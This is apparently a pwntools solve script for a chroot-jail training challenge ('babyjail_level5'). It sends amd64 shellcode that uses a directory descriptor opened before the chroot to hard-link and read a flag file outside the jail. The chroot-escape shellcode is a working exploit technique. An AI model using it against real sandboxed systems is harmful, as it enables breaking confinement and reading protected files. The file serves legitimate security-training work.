#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary_path = './babyjail_level5'  # Adjust as needed

# The fd opened before chroot should be 3 (since stdin=0, stdout=1, stderr=2)
# We'll use that to create a link to the real flag outside the jail

shellcode = asm('''
    /* Create a hard link from /flag outside the jail to /pwned inside the jail */
    mov rax, 265        /* SYS_linkat */
    mov rdi, 3         /* File descriptor from open() before chroot (dirfd) */
    lea rsi, [rip+flag_path]  /* Source pathname */
    mov rdx, -100      /* AT_FDCWD (current working directory) for destination */
    lea r10, [rip+pwned_path] /* Destination pathname */
    xor r8, r8         /* flags = 0 */
    syscall
        
    /* Open the linked file */
    mov rax, 2         /* SYS_open */
    lea rdi, [rip+pwned_path]
    xor rsi, rsi       /* O_RDONLY */
    xor rdx, rdx
    syscall
    
    /* Save flag fd */
    mov rbx, rax
    
    /* Read the flag content */
    xor rax, rax       /* SYS_read */
    mov rdi, rbx       /* Flag fd */
    lea rsi, [rip+buffer]
    mov rdx, 100       /* Read up to 100 bytes */
    syscall
    
    /* Save number of bytes read */
    mov r12, rax
    
    /* Write flag to stdout */
    mov rax, 1         /* SYS_write */
    mov rdi, 1         /* stdout */
    lea rsi, [rip+buffer]
    mov rdx, r12       /* Bytes read */
    syscall
    
    /* Loop forever since we can't exit */
    jmp $

flag_path:
    .string "../flag"  /* Path to flag relative to the opened directory */
pwned_path:
    .string "./pwned"         /* Where to create the link inside the jail */
buffer:
    .space 100
''')

s = '''
b * main+1498
'''
# Run with a directory path as argument, avoiding "flag" in the name
p = process([binary_path, '/etc'])


gdb.attach(p, s)
p.send(shellcode)
p.interactive()
